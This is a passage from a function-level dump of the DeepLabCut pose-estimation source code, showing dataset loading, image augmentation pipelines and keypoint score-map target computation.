        if self.crop_sampling == 'hybrid':
            sampling = random_state.choice(['uniform', 'density'])
        if sampling == 'uniform':
            center = random_state.uniform(size=2)
        else:
            (h, w) = batch.images[n].shape[:2]
            kpts = batch.keypoints[n].to_xy_array()
            kpts = kpts[~np.isnan(kpts).all(axis=1)]
            n_kpts = kpts.shape[0]
            inds = np.arange(n_kpts)
            if sampling == 'density':
                radius = 0.1 * min(h, w)
                n_neighbors = self.calc_n_neighbors(kpts, radius)
                n_neighbors += 1
                p = n_neighbors / n_neighbors.sum()
            else:
                p = np.ones_like(inds) / n_kpts
            center = kpts[random_state.choice(inds, p=p)]
            center[0] += shift_x[n]
            center[0] /= w
            center[1] += shift_y[n]
            center[1] /= h
        offsets[n] = center
    offsets = np.clip(offsets, 0, 1)
    return ([self.size] * n_samples, offsets[:, 0], offsets[:, 1])"
AlexEMG/DeepLabCut,register,"@classmethod
def register(cls, type_):

    def wrapper(dataset):
        if type_ in cls._datasets:
            warnings.warn('Overwriting existing dataset {}.')
        cls._datasets[type_] = dataset
        return dataset
    return wrapper"
AlexEMG/DeepLabCut,create,"@classmethod
def create(cls, cfg):
    dataset_type = cfg['dataset_type']
    dataset = cls._datasets.get(dataset_type)
    if dataset is None:
        raise ValueError(f'Unsupported dataset of type {dataset_type}')
    return dataset(cfg)"
AlexEMG/DeepLabCut,wrapper,"def wrapper(dataset):
    if type_ in cls._datasets:
        warnings.warn('Overwriting existing dataset {}.')
    cls._datasets[type_] = dataset
    return dataset"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    self.cfg = cfg"
AlexEMG/DeepLabCut,load_dataset,"@abc.abstractmethod
def load_dataset(self):
    ..."
AlexEMG/DeepLabCut,next_batch,"@abc.abstractmethod
def next_batch(self):
    ..."
AlexEMG/DeepLabCut,sample_scale,"def sample_scale(self):
    if self.cfg.get('deterministic', False):
        np.random.seed(42)
    scale = self.cfg['global_scale']
    if 'scale_jitter_lo' in self.cfg and 'scale_jitter_up' in self.cfg:
        scale_jitter = np.random.uniform(self.cfg['scale_jitter_lo'], self.cfg['scale_jitter_up'])
        scale *= scale_jitter
    return scale"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(DeterministicPoseDataset, self).__init__(cfg)
    self.data = self.load_dataset()
    self.num_images = len(self.data)
    if self.cfg['mirror']:
        self.symmetric_joints = mirror_joints_map(cfg['all_joints'], cfg['num_joints'])
    self.curr_img = 0
    self.scale = cfg['global_scale']
    self.locref_scale = 1.0 / cfg['locref_stdev']
    self.stride = cfg['stride']
    self.half_stride = self.stride / 2
    self.set_shuffle(cfg['shuffle'])"
AlexEMG/DeepLabCut,load_dataset,"def load_dataset(self):
    cfg = self.cfg
    file_name = os.path.join(self.cfg['project_path'], cfg['dataset'])
    mlab = sio.loadmat(file_name)
    self.raw_data = mlab
    mlab = mlab['dataset']
    num_images = mlab.shape[1]
    data = []
    has_gt = True
    for i in range(num_images):
        sample = mlab[0, i]
        item = DataItem()
        item.image_id = i
        im_path = sample[0][0]
        if isinstance(im_path, str):
            im_path = robust_split_path(im_path)
        else:
            im_path = [s.strip() for s in im_path]
        item.im_path = os.path.join(*im_path)
        item.im_size = sample[1][0]
        if len(sample) >= 3:
            joints = sample[2][0][0]
            joint_id = joints[:, 0]
            if joint_id.size != 0:
                assert np.any(joint_id < cfg['num_joints'])
            joints[:, 0] = joint_id
            item.joints = [joints]
        else:
            has_gt = False
        data.append(item)
    self.has_gt = has_gt
    return data"
AlexEMG/DeepLabCut,set_test_mode,"def set_test_mode(self, test_mode):
    self.has_gt = not test_mode"
AlexEMG/DeepLabCut,set_shuffle,"def set_shuffle(self, shuffle):
    self.shuffle = shuffle
    if not shuffle:
        assert not self.cfg['mirror']
        self.image_indices = np.arange(self.num_images)"
AlexEMG/DeepLabCut,mirror_joint_coords,"def mirror_joint_coords(self, joints, image_width):
    joints[:, 1] = image_width - joints[:, 1] - 1
    return joints"
AlexEMG/DeepLabCut,mirror_joints,"def mirror_joints(self, joints, symmetric_joints, image_width):
    res = np.copy(joints)
    res = self.mirror_joint_coords(res, image_width)
    joint_id = joints[:, 0].astype(int)
    res[:, 0] = symmetric_joints[joint_id]
    return res"
AlexEMG/DeepLabCut,shuffle_images,"def shuffle_images(self):
    if self.cfg['deterministic']:
        np.random.seed(42)
    num_images = self.num_images
    if self.cfg['mirror']:
        image_indices = np.random.permutation(num_images * 2)
        self.mirrored = image_indices >= num_images
        image_indices[self.mirrored] = image_indices[self.mirrored] - num_images
        self.image_indices = image_indices
    else:
        self.image_indices = np.random.permutation(num_images)"
AlexEMG/DeepLabCut,num_training_samples,"def num_training_samples(self):
    num = self.num_images
    if self.cfg['mirror']:
        num *= 2
    return num"
AlexEMG/DeepLabCut,next_training_sample,"def next_training_sample(self):
    if self.curr_img == 0 and self.shuffle:
        self.shuffle_images()
    curr_img = self.curr_img
    self.curr_img = (self.curr_img + 1) % self.num_training_samples()
    imidx = self.image_indices[curr_img]
    mirror = self.cfg['mirror'] and self.mirrored[curr_img]
    return (imidx, mirror)"
AlexEMG/DeepLabCut,get_training_sample,"def get_training_sample(self, imidx):
    return self.data[imidx]"
AlexEMG/DeepLabCut,next_batch,"def next_batch(self):
    while True:
        (imidx, mirror) = self.next_training_sample()
        data_item = self.get_training_sample(imidx)
        scale = self.sample_scale()
        if not self.is_valid_size(data_item.im_size, scale):
            continue
        return self.make_batch(data_item, scale, mirror)"
AlexEMG/DeepLabCut,is_valid_size,"def is_valid_size(self, image_size, scale):
    if 'min_input_size' in self.cfg and 'max_input_size' in self.cfg:
        input_width = image_size[2] * scale
        input_height = image_size[1] * scale
        if input_height < self.cfg['min_input_size'] or input_width < self.cfg['min_input_size']:
            return False
        if input_height * input_width > self.cfg['max_input_size'] ** 2:
            return False
    return True"
AlexEMG/DeepLabCut,make_batch,"def make_batch(self, data_item, scale, mirror):
    im_file = data_item.im_path
    logging.debug('image %s', im_file)
    logging.debug('mirror %r', mirror)
    image = imread(os.path.join(self.cfg['project_path'], im_file), mode='skimage')
    if self.has_gt:
        joints = np.copy(data_item.joints)
    if self.cfg['crop']:
        if np.random.rand() < self.cfg['cropratio']:
            j = np.random.randint(np.shape(joints)[1])
            (joints, image) = crop_image(joints, image, joints[0, j, 1], joints[0, j, 2], self.cfg)
    img = imresize(image, scale) if scale != 1 else image
    scaled_img_size = np.array(img.shape[0:2])
    if mirror:
        img = np.fliplr(img)
    batch = {Batch.inputs: img}
    if self.has_gt:
        stride = self.cfg['stride']
        if mirror:
            joints = [self.mirror_joints(person_joints, self.symmetric_joints, image.shape[1]) for person_joints in joints]
        sm_size = np.ceil(scaled_img_size / (stride * 2)).astype(int) * 2
        scaled_joints = [person_joints[:, 1:3] * scale for person_joints in joints]
        joint_id = [person_joints[:, 0].astype(int) for person_joints in joints]
        (part_score_targets, part_score_weights, locref_targets, locref_mask) = self.compute_target_part_scoremap(joint_id, scaled_joints, data_item, sm_size, scale)
        batch.update({Batch.part_score_targets: part_score_targets, Batch.part_score_weights: part_score_weights, Batch.locref_targets: locref_targets, Batch.locref_mask: locref_mask})
    batch = {key: data_to_input(data) for (key, data) in batch.items()}
    batch[Batch.data_item] = data_item
    return batch"
AlexEMG/DeepLabCut,compute_target_part_scoremap,"def compute_target_part_scoremap(self, joint_id, coords, data_item, size, scale):
    dist_thresh = self.cfg['pos_dist_thresh'] * scale
    dist_thresh_sq = dist_thresh ** 2
    num_joints = self.cfg['num_joints']
    scmap = np.zeros(np.concatenate([size, np.array([num_joints])]))
    locref_size = np.concatenate([size, np.array([num_joints * 2])])
    locref_mask = np.zeros(locref_size)
    locref_map = np.zeros(locref_size)
    width = size[1]
    height = size[0]
    for person_id in range(len(coords)):
        for (k, j_id) in enumerate(joint_id[person_id]):
            joint_pt = coords[person_id][k, :]
            j_x = np.asarray(joint_pt[0]).item()
            j_y = np.asarray(joint_pt[1]).item()
            j_x_sm = round((j_x - self.half_stride) / self.stride)
            j_y_sm = round((j_y - self.half_stride) / self.stride)
            min_x = round(max(j_x_sm - dist_thresh - 1, 0))
            max_x = round(min(j_x_sm + dist_thresh + 1, width - 1))
            min_y = round(max(j_y_sm - dist_thresh - 1, 0))
            max_y = round(min(j_y_sm + dist_thresh + 1, height - 1))
            for j in range(min_y, max_y + 1):
                pt_y = j * self.stride + self.half_stride
                for i in range(min_x, max_x + 1):
                    pt_x = i * self.stride + self.half_stride
                    dx = j_x - pt_x
                    dy = j_y - pt_y
                    dist = dx ** 2 + dy ** 2
                    if dist <= dist_thresh_sq:
                        scmap[j, i, j_id] = 1
                        locref_mask[j, i, j_id * 2 + 0] = 1
                        locref_mask[j, i, j_id * 2 + 1] = 1
                        locref_map[j, i, j_id * 2 + 0] = dx * self.locref_scale
                        locref_map[j, i, j_id * 2 + 1] = dy * self.locref_scale
    weights = self.compute_scmap_weights(scmap.shape, joint_id, data_item)
    return (scmap, weights, locref_map, locref_mask)"
AlexEMG/DeepLabCut,compute_scmap_weights,"def compute_scmap_weights(self, scmap_shape, joint_id, data_item):
    if self.cfg['weigh_only_present_joints']:
        weights = np.zeros(scmap_shape)
        for person_joint_id in joint_id:
            for j_id in person_joint_id:
                weights[:, :, j_id] = 1.0
    else:
        weights = np.ones(scmap_shape)
    return weights"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(ImgaugPoseDataset, self).__init__(cfg)
    self._n_kpts = len(cfg['all_joints_names'])
    self.data = self.load_dataset()
    self.batch_size = cfg.get('batch_size', 1)
    self.num_images = len(self.data)
    self.max_input_sizesquare = cfg.get('max_input_size', 1500) ** 2
    self.min_input_sizesquare = cfg.get('min_input_size', 64) ** 2
    self.locref_scale = 1.0 / cfg['locref_stdev']
    self.stride = cfg['stride']
    self.half_stride = self.stride / 2
    self.scale = cfg['global_scale']
    self.scale_jitter_lo = cfg.get('scale_jitter_lo', 0.75)
    self.scale_jitter_up = cfg.get('scale_jitter_up', 1.25)
    cfg['mirror'] = cfg.get('mirror', False)
    cfg['rotation'] = cfg.get('rotation', True)
    if cfg.get('rotation', True):
        opt = cfg.get('rotation', False)
        if type(opt) == int:
            cfg['rotation'] = cfg.get('rotation', 25)
        else:
            cfg['rotation'] = 25
        cfg['rotratio'] = cfg.get('rotateratio', 0.4)
    else:
        cfg['rotratio'] = 0.0
        cfg['rotation'] = 0
    cfg['covering'] = cfg.get('covering', True)
    cfg['elastic_transform'] = cfg.get('elastic_transform', True)
    cfg['motion_blur'] = cfg.get('motion_blur', True)
    if cfg['motion_blur']:
        cfg['motion_blur_params'] = dict(cfg.get('motion_blur_params', {'k': 7, 'angle': (-90, 90)}))
    print('Batch Size is %d' % self.batch_size)"
AlexEMG/DeepLabCut,load_dataset,"def load_dataset(self):
    cfg = self.cfg
    file_name = os.path.join(self.cfg['project_path'], cfg['dataset'])
    if '.mat' in file_name:
        mlab = sio.loadmat(file_name)
        self.raw_data = mlab
        mlab = mlab['dataset']
        num_images = mlab.shape[1]
        data = []
        has_gt = True
        for i in range(num_images):
            sample = mlab[0, i]
            item = DataItem()
            item.image_id = i
            im_path = sample[0][0]
            if isinstance(im_path, str):
                im_path = robust_split_path(im_path)
            else:
                im_path = [s.strip() for s in im_path]
            item.im_path = os.path.join(*im_path)
            item.im_size = sample[1][0]
            if len(sample) >= 3:
                joints = sample[2][0][0]
                joint_id = joints[:, 0]
                if joint_id.size != 0:
                    assert (joint_id < cfg['num_joints']).any()
                joints[:, 0] = joint_id
                item.joints = [joints]
            else:
                has_gt = False
            data.append(item)
        self.has_gt = has_gt
        return data
    else:
        print('Loading pickle data with float coordinates!')
        file_name = cfg['dataset'].split('.')[0] + '.pickle'
        with open(os.path.join(self.cfg['project_path'], file_name), 'rb') as f:
            pickledata = pickle.load(f)
        self.raw_data = pickledata
        num_images = len(pickledata)
        data = []
        has_gt = True
        for i in range(num_images):
            sample = pickledata[i]
            item = DataItem()
            item.image_id = i
            item.im_path = os.path.join(*sample['image'])
            item.im_size = sample['size']
            if len(sample) >= 3:
                item.num_animals = len(sample['joints'])
                item.joints = [sample['joints']]
            else:
                has_gt = False
            data.append(item)
        self.has_gt = has_gt
        return data"
AlexEMG/DeepLabCut,build_augmentation_pipeline,"def build_augmentation_pipeline(self, height=None, width=None, apply_prob=0.5):
    sometimes = lambda aug: iaa.Sometimes(apply_prob, aug)
    pipeline = iaa.Sequential(random_order=False)
    cfg = self.cfg
    if cfg['mirror']:
        opt = cfg['mirror']
        if type(opt) == int:
            pipeline.add(sometimes(iaa.Fliplr(opt)))
        else:
            pipeline.add(sometimes(iaa.Fliplr(0.5)))
    if cfg.get('fliplr', False) and cfg.get('symmetric_pairs'):
        opt = cfg.get('fliplr', False)
        if type(opt) == int:
            p = opt
        else:
            p = 0.5
        pipeline.add(sometimes(augmentation.KeypointFliplr(cfg['all_joints_names'], symmetric_pairs=cfg['symmetric_pairs'], p=p)))
    if cfg['rotation'] > 0:
        pipeline.add(iaa.Sometimes(cfg['rotratio'], iaa.Affine(rotate=(-cfg['rotation'], cfg['rotation']))))
    if cfg['motion_blur']:
        opts = cfg['motion_blur_params']
        pipeline.add(sometimes(iaa.MotionBlur(**opts)))
    if cfg['covering']:
        pipeline.add(sometimes(iaa.CoarseDropout(0.02, size_percent=0.3, per_channel=0.5)))
    if cfg['elastic_transform']:
        pipeline.add(sometimes(iaa.ElasticTransformation(sigma=5)))
    if cfg.get('gaussian_noise', False):
        opt = cfg.get('gaussian_noise', False)
        if type(opt) == int or type(opt) == float:
            pipeline.add(sometimes(iaa.AdditiveGaussianNoise(loc=0, scale=(0.0, opt), per_channel=0.5)))
        else:
            pipeline.add(sometimes(iaa.AdditiveGaussianNoise(loc=0, scale=(0.0, 0.05 * 255), per_channel=0.5)))
    if cfg.get('grayscale', False):
        pipeline.add(sometimes(iaa.Grayscale(alpha=(0.5, 1.0))))

    def get_aug_param(cfg_value):
        if isinstance(cfg_value, dict):
            opt = cfg_value
        else:
            opt = {}
        return opt
    cfg_cnt = cfg.get('contrast', {})
    cfg_cnv = cfg.get('convolution', {})
    contrast_aug = ['histeq', 'clahe', 'gamma', 'sigmoid', 'log', 'linear']
    for aug in contrast_aug:
        aug_val = cfg_cnt.get(aug, False)
        cfg_cnt[aug] = aug_val
        if aug_val:
            cfg_cnt[aug + 'ratio'] = cfg_cnt.get(aug + 'ratio', 0.1)
    convolution_aug = ['sharpen', 'emboss', 'edge']
    for aug in convolution_aug:
        aug_val = cfg_cnv.get(aug, False)
        cfg_cnv[aug] = aug_val
        if aug_val:
            cfg_cnv[aug + 'ratio'] = cfg_cnv.get(aug + 'ratio', 0.1)
    if cfg_cnt['histeq']:
        opt = get_aug_param(cfg_cnt['histeq'])
        pipeline.add(iaa.Sometimes(cfg_cnt['histeqratio'], iaa.AllChannelsHistogramEqualization(**opt)))
    if cfg_cnt['clahe']:
        opt = get_aug_param(cfg_cnt['clahe'])
        pipeline.add(iaa.Sometimes(cfg_cnt['claheratio'], iaa.AllChannelsCLAHE(**opt)))
    if cfg_cnt['log']:
        opt = get_aug_param(cfg_cnt['log'])
        pipeline.add(iaa.Sometimes(cfg_cnt['logratio'], iaa.LogContrast(**opt)))
    if cfg_cnt['linear']:
        opt = get_aug_param(cfg_cnt['linear'])
        pipeline.add(iaa.Sometimes(cfg_cnt['linearratio'], iaa.LinearContrast(**opt)))
    if cfg_cnt['sigmoid']:
        opt = get_aug_param(cfg_cnt['sigmoid'])
        pipeline.add(iaa.Sometimes(cfg_cnt['sigmoidratio'], iaa.SigmoidContrast(**opt)))
    if cfg_cnt['gamma']:
        opt = get_aug_param(cfg_cnt['gamma'])
        pipeline.add(iaa.Sometimes(cfg_cnt['gammaratio'], iaa.GammaContrast(**opt)))
    if cfg_cnv['sharpen']:
        opt = get_aug_param(cfg_cnv['sharpen'])
        pipeline.add(iaa.Sometimes(cfg_cnv['sharpenratio'], iaa.Sharpen(**opt)))
    if cfg_cnv['emboss']:
        opt = get_aug_param(cfg_cnv['emboss'])
        pipeline.add(iaa.Sometimes(cfg_cnv['embossratio'], iaa.Emboss(**opt)))
    if cfg_cnv['edge']:
        opt = get_aug_param(cfg_cnv['edge'])
        pipeline.add(iaa.Sometimes(cfg_cnv['edgeratio'], iaa.EdgeDetect(**opt)))
    if height is not None and width is not None:
        if not cfg.get('crop_by', False):
            crop_by = 0.15
        else:
            crop_by = cfg.get('crop_by', False)
        pipeline.add(iaa.Sometimes(cfg.get('cropratio', 0.4), iaa.CropAndPad(percent=(-crop_by, crop_by), keep_size=False)))
        pipeline.add(iaa.Resize({'height': height, 'width': width}))
    return pipeline"
AlexEMG/DeepLabCut,get_batch,"def get_batch(self):
    img_idx = np.random.choice(self.num_images, size=self.batch_size, replace=True)
    batch_images = []
    batch_joints = []
    joint_ids = []
    data_items = []
    scale = self.sample_scale()
    found_valid = False
    n_tries = 10
    while n_tries > 1:
        idx = np.random.choice(self.num_images)
        size = self.data[idx].im_size
        target_size = np.ceil(size[1:3] * scale).astype(int)
        if self.is_valid_size(target_size[1] * target_size[0]):
            found_valid = True
            break
        n_tries -= 1
    if not found_valid:
        if size[1] * size[2] > self.max_input_sizesquare:
            s = ('large', 'increasing `max_input_size`', 'decreasing')
        else:
            s = ('small', 'decreasing `min_input_size`', 'increasing')
        raise ValueError(f'Image size {size[1:3]} may be too {s[0]}. Consider {s[1]} and/or {s[2]} `global_scale` in the train/pose_cfg.yaml.')
    stride = self.cfg['stride']
    for i in range(self.batch_size):
        data_item = self.data[img_idx[i]]
        data_items.append(data_item)
        im_file = data_item.im_path
        logging.debug('image %s', im_file)
        image = imread(os.path.join(self.cfg['project_path'], im_file), mode='skimage')
        if self.has_gt:
            joints = data_item.joints
            kpts = np.full((self._n_kpts, 2), np.nan)
            for (n, x, y) in joints[0]:
                kpts[int(n)] = (x, y)
            joint_ids.append([np.arange(self._n_kpts)])
            batch_joints.append(kpts)
        batch_images.append(image)
    sm_size = np.ceil(target_size / (stride * 2)).astype(int) * 2
    assert len(batch_images) == self.batch_size
    return (batch_images, joint_ids, batch_joints, data_items, sm_size, target_size)"
AlexEMG/DeepLabCut,get_scmap_update,"def get_scmap_update(self, joint_ids, joints, data_items, sm_size, target_size):
    (part_score_targets, part_score_weights, locref_targets, locref_masks) = ([], [], [], [])
    for i in range(len(data_items)):
        scale = min(target_size[0] / data_items[i].im_size[1], target_size[1] / data_items[i].im_size[2])
        if self.cfg.get('scmap_type', None) == 'gaussian':
            (part_score_target, part_score_weight, locref_target, locref_mask) = self.gaussian_scmap(joint_ids[i], [joints[i]], data_items[i], sm_size, scale)
        else:
            (part_score_target, part_score_weight, locref_target, locref_mask) = self.compute_target_part_scoremap_numpy(joint_ids[i], [joints[i]], data_items[i], sm_size, scale)
        part_score_targets.append(part_score_target)
        part_score_weights.append(part_score_weight)
        locref_targets.append(locref_target)
        locref_masks.append(locref_mask)
    return {Batch.part_score_targets: part_score_targets, Batch.part_score_weights: part_score_weights, Batch.locref_targets: locref_targets, Batch.locref_mask: locref_masks}"
AlexEMG/DeepLabCut,next_batch,"def next_batch(self):
    while True:
        (batch_images, joint_ids, batch_joints, data_items, sm_size, target_size) = self.get_batch()
        pipeline = self.build_augmentation_pipeline(height=target_size[0], width=target_size[1], apply_prob=0.5)
        (batch_images, batch_joints) = pipeline(images=batch_images, keypoints=batch_joints)
        image_shape = np.array(batch_images).shape[1:3]
        batch_joints_valid = []
        joint_ids_valid = []
        for (joints, ids) in zip(batch_joints, joint_ids):
            mask = ~np.isnan(joints[:, 0])
            joints = joints[mask, :]
            ids = ids[0][mask]
            inside = np.logical_and.reduce((joints[:, 0] < image_shape[1], joints[:, 0] > 0, joints[:, 1] < image_shape[0], joints[:, 1] > 0))
            batch_joints_valid.append(joints[inside])
            joint_ids_valid.append([ids[inside]])
        batch = {Batch.inputs: np.array(batch_images).astype(np.float64)}
        if self.has_gt:
            scmap_update = self.get_scmap_update(joint_ids_valid, batch_joints_valid, data_items, sm_size, image_shape)
            batch.update(scmap_update)
        batch = {key: np.asarray(data) for (key, data) in batch.items()}
        batch[Batch.data_item] = data_items
        return batch"
AlexEMG/DeepLabCut,set_test_mode,"def set_test_mode(self, test_mode):
    self.has_gt = not test_mode"
AlexEMG/DeepLabCut,num_training_samples,"def num_training_samples(self):
    num = self.num_images
    if self.cfg['mirror']:
        num *= 2
    return num"
AlexEMG/DeepLabCut,is_valid_size,"def is_valid_size(self, target_size_product):
    if target_size_product > self.max_input_sizesquare:
        return False
    if target_size_product < self.min_input_sizesquare:
        return False
    return True"
AlexEMG/DeepLabCut,gaussian_scmap,"def gaussian_scmap(self, joint_id, coords, data_item, size, scale):
    num_joints = self.cfg['num_joints']
    scmap = np.zeros(np.concatenate([size, np.array([num_joints])]))
    locref_size = np.concatenate([size, np.array([num_joints * 2])])
    locref_mask = np.zeros(locref_size)
    locref_map = np.zeros(locref_size)
    width = size[1]
    height = size[0]
    dist_thresh = float((width + height) / 6)
    dist_thresh_sq = dist_thresh ** 2
    std = dist_thresh / 4
    grid = np.mgrid[:height, :width].transpose((1, 2, 0))
    grid = grid * self.stride + self.half_stride
    for person_id in range(len(coords)):
        for (k, j_id) in enumerate(joint_id[person_id]):
            joint_pt = coords[person_id][k, :]
            j_x = np.asarray(joint_pt[0]).item()
            j_x_sm = round((j_x - self.half_stride) / self.stride)
            j_y = np.asarray(joint_pt[1]).item()
            j_y_sm = round((j_y - self.half_stride) / self.stride)
            map_j = grid.copy()
            dist = np.linalg.norm(grid - (j_y, j_x), axis=2) ** 2
            scmap_j = np.exp(-dist / (2 * std ** 2))
            scmap[..., j_id] = scmap_j
            locref_mask[dist <= dist_thresh_sq, j_id * 2 + 0] = 1
            locref_mask[dist <= dist_thresh_sq, j_id * 2 + 1] = 1
            dx = j_x - grid.copy()[:, :, 1]
            dy = j_y - grid.copy()[:, :, 0]
            locref_map[..., j_id * 2 + 0] = dx * self.locref_scale
            locref_map[..., j_id * 2 + 1] = dy * self.locref_scale
    weights = self.compute_scmap_weights(scmap.shape, joint_id, data_item)
    return (scmap, weights, locref_map, locref_mask)"
AlexEMG/DeepLabCut,compute_scmap_weights,"def compute_scmap_weights(self, scmap_shape, joint_id, data_item):
    if self.cfg['weigh_only_present_joints']:
        weights = np.zeros(scmap_shape)
        for person_joint_id in joint_id:
            for j_id in person_joint_id:
                weights[:, :, j_id] = 1.0
    else:
        weights = np.ones(scmap_shape)
    return weights"
AlexEMG/DeepLabCut,compute_target_part_scoremap_numpy,"def compute_target_part_scoremap_numpy(self, joint_id, coords, data_item, size, scale):
    dist_thresh = float(self.cfg['pos_dist_thresh'] * scale)
    dist_thresh_sq = dist_thresh ** 2
    num_joints = self.cfg['num_joints']
    scmap = np.zeros(np.concatenate([size, np.array([num_joints])]))
    locref_size = np.concatenate([size, np.array([num_joints * 2])])
    locref_mask = np.zeros(locref_size)
    locref_map = np.zeros(locref_size)
    width = size[1]
    height = size[0]
    grid = np.mgrid[:height, :width].transpose((1, 2, 0))
    for person_id in range(len(coords)):
        for (k, j_id) in enumerate(joint_id[person_id]):
            joint_pt = coords[person_id][k, :]
            j_x = np.asarray(joint_pt[0]).item()
            j_x_sm = round((j_x - self.half_stride) / self.stride)
            j_y = np.asarray(joint_pt[1]).item()
            j_y_sm = round((j_y - self.half_stride) / self.stride)
            min_x = round(max(j_x_sm - dist_thresh - 1, 0))
            max_x = round(min(j_x_sm + dist_thresh + 1, width - 1))
            min_y = round(max(j_y_sm - dist_thresh - 1, 0))
            max_y = round(min(j_y_sm + dist_thresh + 1, height - 1))
            x = grid.copy()[:, :, 1]
            y = grid.copy()[:, :, 0]
            dx = j_x - x * self.stride - self.half_stride
            dy = j_y - y * self.stride - self.half_stride
            dist = dx ** 2 + dy ** 2
            mask1 = dist <= dist_thresh_sq
            mask2 = (x >= min_x) & (x <= max_x)
            mask3 = (y >= min_y) & (y <= max_y)
            mask = mask1 & mask2 & mask3
            scmap[mask, j_id] = 1
            locref_mask[mask, j_id * 2 + 0] = 1
            locref_mask[mask, j_id * 2 + 1] = 1
            locref_map[mask, j_id * 2 + 0] = (dx * self.locref_scale)[mask]
            locref_map[mask, j_id * 2 + 1] = (dy * self.locref_scale)[mask]
    weights = self.compute_scmap_weights(scmap.shape, joint_id, data_item)
    return (scmap, weights, locref_map, locref_mask)"
AlexEMG/DeepLabCut,get_aug_param,"def get_aug_param(cfg_value):
    if isinstance(cfg_value, dict):
        opt = cfg_value
    else:
        opt = {}
    return opt"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(MAImgaugPoseDataset, self).__init__(cfg)
    if cfg.get('pseudo_label', ''):
        self._n_kpts = len(cfg['all_joints_names'])
        self._n_animals = 1
    else:
        self.main_cfg = auxiliaryfunctions.read_config(os.path.join(self.cfg['project_path'], 'config.yaml'))
        (animals, unique, multi) = auxfun_multianimal.extractindividualsandbodyparts(self.main_cfg)
        self._n_kpts = len(multi) + len(unique)
        self._n_animals = len(animals)
    if cfg.get('pseudo_label', '').endswith('.h5'):
        assert cfg['video_path']
        print('loading video for image source', cfg['video_path'])
        self.vid = VideoReader(cfg['video_path'])
        self.video_image_size = (3, self.vid.height, self.vid.width)
    else:
        self.vid = None
    self.data = self.load_dataset()
    self.num_images = len(self.data)
    self.batch_size = cfg['batch_size']
    print('Batch Size is %d' % self.batch_size)
    self._default_size = np.array(self.cfg.get('crop_size', (400, 400)))
    self.pipeline = self.build_augmentation_pipeline(apply_prob=cfg.get('apply_prob', 0.5))"
AlexEMG/DeepLabCut,default_size,"@property
def default_size(self):
    return self._default_size"
AlexEMG/DeepLabCut,default_size,"@default_size.setter
def default_size(self, size):
    self._default_size = np.array(size)"
AlexEMG/DeepLabCut,load_dataset,"def load_dataset(self):
    cfg = self.cfg
    if cfg.get('pseudo_label', ''):
        if cfg['pseudo_label'].endswith('.h5'):
            pseudo_threshold = cfg.get('pseudo_threshold', 0)
            print(f'Loading pseudo labels with threshold > {pseudo_threshold}')
            mask_kpts_below_thresh = 'topview' in cfg.get('superanimal', '')
            return self._load_pseudo_data_from_h5(cfg, threshold=pseudo_threshold, mask_kpts_below_thresh=mask_kpts_below_thresh)
    file_name = os.path.join(self.cfg['project_path'], cfg['dataset'])
    with open(os.path.join(self.cfg['project_path'], file_name), 'rb') as f:
        pickledata = pickle.load(f)
    self.raw_data = pickledata
    num_images = len(pickledata)
    data = []
    has_gt = True
    for i in range(num_images):
        sample = pickledata[i]
        item = DataItem()
        item.image_id = i
        im_path = sample['image']
        if isinstance(im_path, str):
            im_path = robust_split_path(im_path)
        item.im_path = os.path.join(*im_path)
        item.im_size = sample['size']
        if 'joints' in sample.keys():
            Joints = sample['joints']
            if np.size(np.concatenate([Joints[person_id][:, 1:3] for person_id in Joints.keys()])) > 0:
                item.joints = Joints
            else:
                has_gt = False
        else:
            has_gt = False
        data.append(item)
    self.has_gt = has_gt
    return data"
AlexEMG/DeepLabCut,_load_pseudo_data_from_h5,"def _load_pseudo_data_from_h5(self, cfg, threshold=0.5, mask_kpts_below_thresh=False):
    gt_file = cfg['pseudo_label']
    assert os.path.exists(gt_file)
    path_ = Path(gt_file)
    print('Using gt file:', path_.name)
    num_kpts = len(cfg['all_joints_names'])
    df = pd.read_hdf(gt_file)
    video_name = path_.name.split('DLC')[0]
    video_root = str(path_.parents[0] / video_name)
    itemlist = []
    for (image_id, imagename) in enumerate(df.index):
        item = DataItem()
        data = df.loc[imagename]
        kpts = data.to_numpy().reshape(-1, 3)
        item.num_joints = kpts.shape[0]
        joint_ids = np.arange(item.num_joints)[..., np.newaxis]
        frame_name = 'frame_' + str(int(imagename.split('frame')[1])) + '.png'
        item.im_path = os.path.join(video_root, frame_name)
        if self.vid:
            item.im_size = self.video_image_size
        else:
            item.im_size = read_image_shape_fast(os.path.join(video_root, frame_name))
        item.joints = {}
        if not mask_kpts_below_thresh:
            joints = np.concatenate([joint_ids, kpts], axis=1)
            joints = np.nan_to_num(joints, nan=0)
        else:
            for (kpt_id, kpt) in enumerate(kpts):
                if kpt[-1] < threshold:
                    kpts[kpt_id][:-1] = -1
                if np.isnan(kpt[0]):
                    kpts[kpt_id][:-1] = -1
                    kpts[kpt_id][-1] = 1
            joints = np.concatenate([joint_ids, kpts], axis=1)
        sparse_joints = []
        for coord in joints:
            if coord[1] != 0 and coord[3] > threshold:
                sparse_joints.append(coord[:3])
        temp = np.array(sparse_joints)
        item.joints.update({0: temp})
        itemlist.append(item)
    self.has_gt = True
    return itemlist"
AlexEMG/DeepLabCut,build_augmentation_pipeline,"def build_augmentation_pipeline(self, apply_prob=0.5):
    cfg = self.cfg
    sometimes = lambda aug: iaa.Sometimes(apply_prob, aug)
    pipeline = iaa.Sequential(random_order=False)
    pre_resize = cfg.get('pre_resize')
    if cfg.get('traintime_resize', False):
        print('using traintime resize')
        pipeline.add(iaa.Resize({'height': 400, 'width': 'keep-aspect-ratio'}))
    crop_sampling = cfg.get('crop_sampling', 'hybrid')
    if pre_resize:
        (width, height) = pre_resize
        pipeline.add(iaa.Resize({'height': height, 'width': width}))
        if crop_sampling == 'none':
            self.default_size = (width, height)
    if crop_sampling != 'none':
        pipeline.add(iaa.PadToFixedSize(*self.default_size))
        pipeline.add(augmentation.KeypointAwareCropToFixedSize(*self.default_size, cfg.get('max_shift', 0.4), crop_sampling))
    if cfg.get('fliplr', False) and cfg.get('symmetric_pairs'):
        opt = cfg.get('fliplr', False)
        if type(opt) == int:
            p = opt
        else:
            p = 0.5
        pipeline.add(sometimes(augmentation.KeypointFliplr(cfg['all_joints_names'], symmetric_pairs=cfg['symmetric_pairs'], p=p)))
    if cfg.get('rotation', False):
        opt = cfg.get('rotation', False)
        if type(opt) == int:
